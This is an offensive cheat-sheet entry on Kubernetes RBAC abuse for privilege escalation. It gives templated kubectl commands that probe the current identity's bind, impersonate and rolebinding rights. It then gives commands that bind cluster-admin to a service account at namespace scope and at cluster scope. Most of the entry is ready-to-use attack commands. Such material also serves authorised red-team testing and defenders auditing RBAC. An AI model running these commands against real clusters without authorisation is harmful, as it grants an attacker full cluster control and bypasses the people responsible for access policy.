---
technique: Kubernetes RBAC Abuse
category: privilege-escalation
targets: Kubernetes RBAC
protocols: Kubernetes API
remote_capable: true
tags: kubernetes privilege-escalation rbac cluster-admin service-account
---

# Kubernetes RBAC Abuse

Kubernetes RBAC abuse uses excessive verbs such as `create pods`, `create rolebindings`, `escalate`, `bind`, `impersonate`, or `secrets get` to expand control.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Useful RBAC verb | Current identity must have an escalation-relevant permission |
| Target subject | Abuse usually binds a user, group, or service account |
| Cluster policy | Admission and RBAC aggregation may limit impact |

## Linux

### Check bind rights

#sh #kubectl #rbac

Check whether the current identity can bind cluster roles.

```sh title:"Check clusterrole bind rights"
kubectl auth can-i bind clusterrole/cluster-admin
```
<!-- cheat -->

### Check impersonation rights

#sh #kubectl #rbac

Check whether the current identity can impersonate users.

```sh title:"Check user impersonation rights"
kubectl auth can-i impersonate users
```
<!-- cheat -->

### Check rolebinding creation

#sh #kubectl #rbac

Check whether the current identity can create role bindings.

```sh title:"Check rolebinding creation rights"
kubectl auth can-i create rolebindings -n "$namespace"
```
<!-- cheat
var namespace
-->

### Create admin rolebinding

#sh #kubectl #rbac

Bind cluster-admin to a service account in a namespace.

```sh title:"Create cluster-admin rolebinding"
kubectl create rolebinding "$binding_name" --clusterrole=cluster-admin --serviceaccount="$namespace:$service_account" -n "$namespace"
```
<!-- cheat
var binding_name
var namespace
var service_account
-->

### Create cluster admin binding

#sh #kubectl #rbac

Bind cluster-admin at cluster scope to a service account.

```sh title:"Create cluster-admin clusterrolebinding"
kubectl create clusterrolebinding "$binding_name" --clusterrole=cluster-admin --serviceaccount="$namespace:$service_account"
```
<!-- cheat
var binding_name
var namespace
var service_account
-->
